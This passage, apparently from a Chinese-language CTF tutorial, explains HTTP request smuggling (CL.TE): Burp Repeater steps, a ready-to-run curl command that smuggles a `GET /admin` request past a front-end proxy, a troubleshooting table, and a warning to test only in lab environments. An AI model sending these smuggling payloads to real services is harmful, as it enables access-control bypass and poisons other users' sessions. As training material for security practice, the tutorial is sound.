4. **发送走私请求**：点 Send。前端按 CL 把整包转发，后端按 TE 把 `0` 之后的走私请求排队处理。走私请求的响应不会直接回到你这个请求里（前端没「看见」它）。
5. **删除/忽略当前前端请求，发一个普通请求观察**：在 Repeater 里删掉当前请求内容（或新建标签页），粘贴普通请求 `GET / HTTP/1.1` + Host，再点 Send。**第二次的响应就是被走私请求的响应**——如果返回的是 `/admin` 的内容（或 404/403 管理页特征），走私成功。
6. **对照验证**：直接 `curl -s http://target/admin` 看真实 `/admin` 响应长什么样，和走私拿到的一对比。

如果不行：第 2 次响应还是正常首页 → 要么 CL 算错、要么该环境是 TE.CL/TE.TE 而非 CL.TE，换模板重试。

> [!tip] 线下做题多数情况直接给模板改路径即可。调试批量变体用 Burp 的 **Turbo Intruder** 或 `http-request-smuggler` 扩展，不用手改几十次。

#### 第 5 步：用 curl 发带响应走私
操作：不想开 Burp 时，用 bash 的 `$'...'` 语法保证 `\r\n` 原样输出：

```bash
curl -s -i http://target/ -H 'Content-Length: 150' -H 'Transfer-Encoding: chunked' \
  --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\nX: X\r\n\r\n'
```

预期结果：这条请求发出后，再发一条普通 `curl -s http://target/`，第二条的响应可能显示被拼接的 `/admin` 结果。
含义：`--data-binary` 保证 body 不被 curl 改写；`$'...'` 里的 `\r\n` 是真正的回车换行。**Windows 的 cmd/PowerShell 里 `$'...'` 不可用，直接建议用 Burp Repeater**。
如果不行：Windows 环境出现换行问题，改用 Burp 或把 payload 写文件用 `--data-binary @file` 传入。

#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| Repeater 里 CL 老是变 | 没关「Update Content-Length」 | 取消勾选后手动填 CL |
| 走私请求没生效 | CL 字节数算错 | 选中 body 看字节数，精确等于 CL |
| 双头请求直接 400 | 现代服务器拒绝 CL+TE 并存 | 环境不支持，换题 |
| 第二次响应还是正常页面 | 该环境不是 CL.TE | 依次试 TE.CL、TE.TE 模板 |
| 走私后连接一直挂起 | chunked 缺 `0\r\n\r\n` 结束序列 | 检查 `0` 块后的空行 |
| TE.CL 的块大小改错 | `5c` 未随内容长度更新 | 重新数字节换算十六进制 |

#### 实战要点
- 默认先试 CL.TE（最常见），被 400 拒绝再考虑 TE.TE 混淆（第 3 步变体）。
- Repeater 三件事：关自动 CL、贴模板、数准 CL 字节数。
- 验证看第二次普通请求的响应内容，而不是第一次的。
- 每个变体失败都记一下「回 400 / 回正常 / 挂起」，三种反应分别对应「不支持 / 类型不对 / chunked 没结束」。
- 走私探测会污染他人请求，只在靶场/自己的题目环境测。

> [!danger] 走私请求的响应会发给「连接上的下一个请求」——在真实服务上测试会污染其他用户会话，线下赛只在靶场/自己的题目环境打。
